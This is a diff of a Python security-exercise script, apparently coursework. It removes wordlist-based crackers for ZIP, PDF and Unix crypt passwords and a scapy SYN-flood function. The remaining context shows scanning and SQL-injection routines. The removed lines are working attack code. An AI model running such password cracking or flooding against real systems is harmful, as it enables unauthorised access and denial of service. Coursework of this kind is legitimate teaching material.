@@ -3,70 +3,10 @@
 # UNI: afq2101
 from __future__ import print_function
 from os import popen
-from pikepdf import open as PdfFileReader
-import crypt
-from zipfile import ZipFile
 import urllib.request
 import urllib.error
 import requests
-from extra import *
 counter = 0
-
-
-def extract_file(zip_file, password):
-    try:
-        ZipFile(zip_file).extractall(pwd=password.encode('cp850', 'replace'))
-        return True
-    except Exception:
-        return False
-
-
-def crack_zip_file(zip_file, file="password.txt"):
-    with open(file) as fd:
-        for line in fd:
-            if '#' in line:
-                continue
-            password = line.strip('\n')
-            if extract_file(zip_file, password):
-                print("[+] Password = " + password)
-                return
-    print("Password not found!")
-
-
-def crack_local_host(crypt_pass, file="password.txt"):
-    with open(file) as fd:
-        for word in fd:
-            if '#' in word:
-                continue
-            word = word.strip('\n')
-            print(word)
-            salt = crypt_pass[3:12]
-            passwd = crypt.crypt(word, '$6$' + salt)
-            if passwd == crypt_pass:
-                print("[+] Found Password: " + word)
-                return
-    print("Password Not Found!")
-
-
-def extract_pdf(pdf, password):
-    try:
-        with open(pdf, "rb") as input_file:
-            PdfFileReader(input_file, password)
-            return True
-    except Exception:
-        return False
-
-
-def crack_pdf_file(pdf, file="password.txt"):
-    with open(file, "r") as fd:
-        for line in fd:
-            if '#' in line:
-                continue
-            password = line.strip('\n')
-            if extract_pdf(pdf, password):
-                print("[+] Password = " + password)
-                return
-    print("Password Not Found!")
 
 
 def network_scan(ip_address):
@@ -156,19 +96,6 @@ def port_scanner(src_ip="127.0.0.1", target_ip="127.0.0.1", src_port=1024, desti
         current_port = current_port + 1
 
 
-# Option 1 - Conduct Denial of Service Attack
-def syn_flood(target_ip, target_port, packets_send=1000000):
-    count = 0
-    print("START SYN_FLOOD")
-    while count < packets_send:
-        # Creates the packet and assigns it to variable a
-        a = IP(src="127.0.0.1", dst=target_ip)/TCP(flags="S", sport=RandShort(), dport=int(target_port))
-        send(a)  # Sends the Packet
-        count = count + 1
-        # print(str(count) + " Packets Sent")
-    print("END_SYN_FLOOD")
-
-
 # Option 3 - SQL Inject
 def sql_inject(host, target_path, sql_attacks="sql_attack.txt"):
     with open(sql_attacks) as fd:
@@ -221,7 +148,7 @@ def pid_to_port():
                     port_to_pid[s_port] = pid
                     port_to_pid[d_port] = pid
                     print("Source IP/Port" + str(s_ip)+":" + str(s_port))
-                    print("Desintation IP/Port" + str(d_ip)+":" + str(d_port))
+                    print("Destintation IP/Port" + str(d_ip)+":" + str(d_port))
                     print("Process ID: " + pid + " Name: " + process_name)
     return port_to_pid
 
